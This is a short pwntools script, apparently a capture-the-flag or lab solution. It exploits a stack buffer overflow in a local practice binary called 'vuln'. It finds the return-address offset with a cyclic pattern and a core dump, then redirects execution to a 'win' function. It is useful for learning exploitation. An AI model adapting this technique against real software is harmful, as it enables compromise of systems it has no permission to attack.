from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)

p = process(elf.path)

win = elf.sym["win"]

log.info(f"win() = {hex(win)}")

# Find this experimentally with a cyclic crash
payload = cyclic(200)

p.sendline(payload)
p.wait()

core = p.corefile

offset = cyclic_find(core.read(core.rsp, 8))

log.info(f"offset = {offset}")

payload = flat(
    b"A" * offset,
    win
)

p = process(elf.path)
p.sendline(payload)

p.interactive()
